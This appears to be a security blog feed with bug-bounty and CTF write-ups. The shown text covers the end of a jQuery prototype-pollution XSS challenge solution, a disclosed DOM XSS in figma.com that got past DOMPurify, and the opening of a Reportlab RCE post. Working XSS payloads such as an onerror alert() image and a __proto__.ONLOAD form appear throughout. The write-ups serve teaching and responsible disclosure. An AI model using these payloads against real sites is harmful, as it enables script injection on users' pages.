			<span class="k">for </span><span class="p">(</span> <span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
				<span class="nf">fn</span><span class="p">(</span>
					<span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">?</span>
						<span class="nx">value</span> <span class="p">:</span>
						<span class="nx">value</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">i</span><span class="p">,</span> <span class="nf">fn</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">)</span>
				<span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nf">access</span><span class="p">(</span> <span class="nx">elems</span><span class="p">,</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">key</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">emptyGet</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">);</span>
		<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/3bd3aa7a-f77a-4062-96a5-796f64db3b98" alt="image" /></p>

<p>elems contains a reference to the iframe element and key contains the json object which passed in as argument to the attr method</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">});</span>
</code></pre></div></div>

<p>so key was equal to</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
 <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
 <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Thanks to the prototype pollution bug, even though only two attributes were provided (src,hidden)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
		<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/b0479b85-9ef0-45be-90da-27d131b993d1" alt="image" /></p>

<p>See <code class="language-plaintext highlighter-rouge">test</code> came from the <code class="language-plaintext highlighter-rouge">__proto__</code></p>

<p>If I can somehow fix that ‚Äúset‚Äù in error , I would be able to get a very simple xss as</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="c1">// error trigger here</span>
                <span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nx">elem</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="o">+</span> <span class="dl">""</span> <span class="p">);</span> <span class="c1">// here is the sink</span>
            <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
</code></pre></div></div>

<p>For other attributes <code class="language-plaintext highlighter-rouge">hooks</code> is undefined so it skips the if statement and directly reaches the sink which sets the attribute to the elem (refrencing to the iframe tag)</p>

<p>By polluting some properties like this, it can give you xss (if you can somehow skip the hooks if condition check)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">srcdoc</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert()</span><span class="dl">"</span>
</code></pre></div></div>

<p>This is where it took me much time to figure out the solution https://gist.github.com/Sudistark/d869e505c8ff45c3bb96612bcb2c953b even tried asking Mizu if I was on the right path or not</p>

<p>He told me yeah it should work as this is the unintended solution which everyone was using :p,as I knew there must be something I am still missing I looked at it again and again to fix it but still had no success.
I was looking for a way to make hooks undefined,which didn‚Äôt looked possible as the polluted property will be available to all the objects.</p>

<p>Next day when I again looked at it, I noticed that:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
</code></pre></div></div>

<p>They were transforming the polluted property to lowercase before using it, so if for eg pollute a propert <code class="language-plaintext highlighter-rouge">SRCDOC</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">SRCDOC</span><span class="o">=</span><span class="mi">1337</span>

<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span><span class="dl">"</span><span class="s2">srcdoc</span><span class="dl">"</span><span class="p">]</span> <span class="c1">// undefined as only the SRCDOC exists not srcdoc in the prototype chain</span>
</code></pre></div></div>

<p>Due to the lowercase transformation it was possible to make hooks undefined and reach the sink easily.</p>

<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.ONLOAD%22%20value=%22alert()%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>

<p>Final payload</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> 
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span> 
<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"__proto__.ONLOAD"</span> <span class="na">value=</span><span class="s">"alert()"</span><span class="nt">/&gt;</span> 
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/287124f6-67ef-47e9-b347-a095a98f2124" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[Mizu put another great xss challenge at the start of this year, so I went all in to solve it this time finally :p]]></summary></entry><entry><title type="html">Interesting case of a DOM XSS in www.figma.com</title><link href="http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com.html" rel="alternate" type="text/html" title="Interesting case of a DOM XSS in www.figma.com" /><published>2023-10-20T00:00:00+05:30</published><updated>2023-10-20T00:00:00+05:30</updated><id>http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com</id><content type="html" xml:base="http://localhost:4000/2023/10/20/Interesting-case-of-a-DOM-XSS-in-www.figma.com.html"><![CDATA[<p>Recently I was able to find a DOM based xss in www.figma.com in collaboration with <a href="https://twitter.com/aszx87410">@huli</a> (an awesome ctf player).</p>

<p>The cause of the XSS is really interesting, at first sight if you are not aware of the weird browser quirk everything looks secure as it‚Äôs going through a sanitization process using the unfamous sanitizer ‚ÄúDomPurify‚Äù , props to huli for identifying this.</p>

<p>Figma is really a tough target I feel, they have really done very well securing their site.So if you are looking for a tough target with a good security team then give a shot to Figma program. I was focusing on their desktop app which is build in Electron hoping I could learn more about Electron hacking stuff along with it.So I thought maybe if I can xss somewhere that could be useful in the Desktop app.</p>

<p>After some time looking here there, I was able to find a place where it allowed the user to make the description text bold,italic this looked interesting.</p>

<p>Users can publish their design to the public , it‚Äôs accessible under this url: <code class="language-plaintext highlighter-rouge">https://www.figma.com/community/file/*</code></p>

<p><img src="https://user-images.githubusercontent.com/31372554/276819715-a519019f-626c-44c3-a761-616bc34666dd.png" alt="image" /></p>

<p>In this screenshot you could see that we can some do some styling stuffs such as bold,italic. Upon intercepting the submit request for this:</p>

<p>I noticed raw html tags there.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>If you try to include <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> directly from the editor (website UI) they will appear as html encoded in the request:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&amp;lt;img src=x onerror=alert()&amp;gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>So instead I directly edited the raw request and modified the <code class="language-plaintext highlighter-rouge">description</code> key to include a xss payload:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Published to Community hub"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;&lt;strong&gt;&lt;em&gt;shirley&lt;img src=x onerror=alert()&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The success response  had the full payload as it is there, this indicated that if there was any sanitization it would be happening on the client side only not server side.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276824564-d11e70d0-79cc-469f-9a6b-7a6640fa0b30.png" alt="chrome_0Tq9BqZHXy" /></p>

<p>From <em>Inspect Element</em> I could confirm that the img tag was removed,so surely some sanitization was there.</p>

<hr />

<p>Using DOMInvader , I found where the sanitization is occuring:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276832784-5e452e93-9d73-4264-9ce3-0338b1946185.png" alt="chrome_0o4gHfz2j8" />
<img src="https://user-images.githubusercontent.com/31372554/276832865-0f1341e2-85d2-49a5-bb66-56ef0cd077a0.png" alt="image" /></p>

<p>https://www.figma.com/esbuild-artifacts/ea8217961882eb1214f870449504b1c89251179b/js/figma_app.min.js:3213:35988</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span> <span class="c1">// [2]</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">HAm</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span> <span class="c1">// [3]</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">e</code> variable contained the description key value.
On line [1] you could see the user controllable input is assigned to innerHTML property of a newly created div element (<code class="language-plaintext highlighter-rouge">createElement("div")</code>). As it‚Äôs not currently added to the dom yet this is fine.</p>

<p>From line [2], the code removes all the tags from the input (description field) which are not in the IFs array (considered it to be an whitelist of allowed tags)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">IFs</span>
<span class="p">(</span><span class="mi">20</span><span class="p">)[</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">span</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sub</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">sup</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">i</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">pre</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">code</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">em</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strike</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strong</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h2</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">h3</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ul</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ol</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hr</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">br</span><span class="dl">'</span><span class="p">]</span>
</code></pre></div></div>

<p>After this modification, it is then sanitized HAm is nothing but dompurify object itself</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HAm</span><span class="p">.</span><span class="nx">version</span>
<span class="dl">'</span><span class="s1">2.3.1</span><span class="dl">'</span>

</code></pre></div></div>
<p>Also if you search for dompurify in the same js file you will find this:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dompurify</span><span class="o">/</span><span class="nx">dist</span><span class="o">/</span><span class="nx">purify</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span>
  <span class="p">(</span><span class="o">*!</span> <span class="p">@</span><span class="nd">license</span> <span class="nx">DOMPurify</span> <span class="mf">2.3</span><span class="p">.</span><span class="mi">1</span>
</code></pre></div></div>

<p>The version used here is pretty old, the latest one is 3.0.6.
But there are no known bypasses so it‚Äôs fine.</p>

<p>Finding 0day in dompurify isn‚Äôt an option here neither I am skilled enough to find one so what else can we do in this situation?</p>

<p>The only possible solution I had in my mind was do something via DOM Clobbering. An example case of dom clobbering in the wild can be found here: https://research.securitum.com/xss-in-amp4email-dom-clobbering/</p>

<p>But still I am not good with that, so instead I tried reaching out to some CTF players. I really respect CTF players when it comes to exploiting such bugs they are the ones you should reach out to as they are aware with many weird quirks which not everyone is aware of.</p>

<hr />

<p>Shared the details with Huli, the next day he tells me that he is able to execute js but CSP is blocking it.</p>

<p>When I saw the payload  I didn‚Äôt believed it:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276841524-00bdcff1-b628-48cc-877a-46fa9673c339.png" alt="image" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I was really baffled how could this simple payload can bypass a sanitizer like DOMPurify. I really had a hard time understanding this at first even after huli tried explaining it many times.</p>

<p>Some snapshot for you to understand also what actually happened:</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276843048-a122d366-8150-4085-9272-3e638a25cb9e.png" alt="image" />
<img src="https://user-images.githubusercontent.com/31372554/276843242-20e09a8c-7fba-4c7b-80cf-4aab57095e1a.png" alt="image" />
<img src="https://user-images.githubusercontent.com/31372554/276843373-c4b65d58-14d3-4c0d-a0ae-bd51b5becee1.png" alt="image" /></p>

<p>https://x.com/ZeddYu_Lu/status/1421091362410156032?s=20</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276843791-aa0bad98-153e-4cbe-a84c-5f21ca0689ec.png" alt="image" /></p>

<hr />

<p>Try it yourself ,open developer tools try this</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span><span class="p">;</span>
</code></pre></div></div>

<p>Even though the div element isn‚Äôt added to the DOM it still <strong>executes</strong> . It‚Äôs like  a magic really.</p>

<hr />

<p>We really tried escalating this, but the strict csp blocked  our all attempts. We decided to report it as it is without CSP bypass, mature programs often accepts xss bugs even without CSP eg: is GoogleVRP</p>

<p>If you are curios here‚Äôs the csp:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script-src 'unsafe-eval' 'nonce-PVEIuETDGJR+8hIA6PqgIQ==' 'strict-dynamic' ; 
</code></pre></div></div>

<p>The reporting experience was very smooth, the Figma sec team is really professional. The bug was fixed (in a week after triage which I consider really great even for bugs like xss) was soon and the team ‚Äúreally liked this cool bug‚Äù they said :)</p>

<p>We were awarded 1k$ for this bug and the severity was scored as Medium.
<img src="https://user-images.githubusercontent.com/31372554/276845729-faba7890-2c4c-4d33-a666-d24ccd3c6b2d.png" alt="image" /></p>

<p>I asked them though if severity was set to Medium because we were not able to provide a csp bypass and they gave their explanation which I happily agree with.</p>

<p><img src="https://user-images.githubusercontent.com/31372554/276846064-25bb917d-36c2-429c-9c97-a9a9677f783f.png" alt="image" /></p>

<p>Overall it was a great experience submitting a report to Figma, their team is reall great.</p>

<p>Note: If you got more details on that innerHTML quirk would be happy if you could explain in the tweet reply why it really works</p>

<hr />

<p><strong>Fix:</strong></p>

<p>After the fix the code responsible for sanitization was changed to this:</p>

<p>Fixed version</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span>
</code></pre></div></div>

<p>Before it was like this (vulnerable version):</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       <span class="kd">let</span> <span class="nx">g</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">g</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">nJe</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">v</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">g</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">v</span> <span class="k">of</span> <span class="nx">b</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">y</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">y</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">v</span><span class="p">);</span>
        <span class="nx">n</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">tAr</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">g</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span> <span class="c1">// [2]</span>
</code></pre></div></div>
<p>The root cause of xss bug was because of passing user controllable input to innerHTML at line [1] and later sanitization on line  [2]. Although the div element was not added to the dom it still executed, it‚Äôs one of the weird quirks of browsers.</p>

<p>This line is now edited and now the input is sanitized first, then only it‚Äôs passed to innerHTML.</p>

<p>This changes ensures that the same xss bug can‚Äôt be trigger now.</p>

<p>As you can noticed that after the sanitization the code is trying to remove all tags which are not in <code class="language-plaintext highlighter-rouge">IFs</code> array from the sanitized output.
Making any changes to the sanitized data can lead to unexpected problems even xss sometimes like you could see in these findings by Sonar Research team https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/</p>

<p>So @huli had  a suggestion to use the sanitize method twice, for eg:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">let</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span> <span class="c1">// [1]</span>
        <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">IFs</span><span class="p">.</span><span class="nf">map</span><span class="p">(</span><span class="nx">y</span><span class="o">=&gt;</span><span class="s2">`:not(</span><span class="p">${</span><span class="nx">y</span><span class="p">}</span><span class="s2">)`</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
          <span class="p">,</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
        <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">y</span> <span class="k">of</span> <span class="nx">g</span><span class="p">)</span>
            <span class="p">(</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">y</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">)</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">h</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
        <span class="nx">r</span><span class="p">.</span><span class="nx">current</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">Hum</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span>
</code></pre></div></div>

<p>On the last line you could see that sanitize method is called again, this will ensure that even after modification, only the safe html will added to the DOM.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[Recently I was able to find a DOM based xss in www.figma.com in collaboration with @huli (an awesome ctf player).]]></summary></entry><entry><title type="html">Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program</title><link href="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html" rel="alternate" type="text/html" title="Exploiting CVE-2023-33733 RCE via HTMLi in Reportlab in a Bug Bounty Program" /><published>2023-10-08T00:00:00+05:30</published><updated>2023-10-08T00:00:00+05:30</updated><id>http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup</id><content type="html" xml:base="http://localhost:4000/2023/10/08/CVE-2023-33733-rce-via-htmli-in-reportlab-BB-Writeup.html"><![CDATA[<p>This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.</p>

<p>In this writeup I will go through the steps I took to identify what the target was using to generate pdfs then how I was able to confirm the rce.</p>

<p>You can find more details of the exploit I used here: https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>

<p>CVE-2023-33733 was found by a pentester from Cure53 Elyas Damej , so props to him for finding this and also sharing the poc with so much details https://github.com/c53elyas/CVE-2023-33733</p>

<hr />

<p>The target announced a new scope was added to their program so without wasting any time I jumped back right to it to see if I can find something there.</p>

<p>I first started with going through the application seeing what the functionalities are there. The application had very limited things to test , basically the application was designed for Dentist where they could upload their patients xray reports (png,jpg,etc were allowed).</p>

<p>After uploading the xray image you can edit some fields such as Patient Name,Date of Report,Comments,etc. Once you have added all the required details you can print the xray report which has the xray image ,patient name,date of report ,etc in it.</p>

<p>I am always fascinated with such pdf render endpoints , have exploited some in the past too https://x.com/sudhanshur705/status/1618608391391449090?s=20</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/21494dad-8494-40ef-9fd2-d1fb73ccb657" alt="image" /></p>

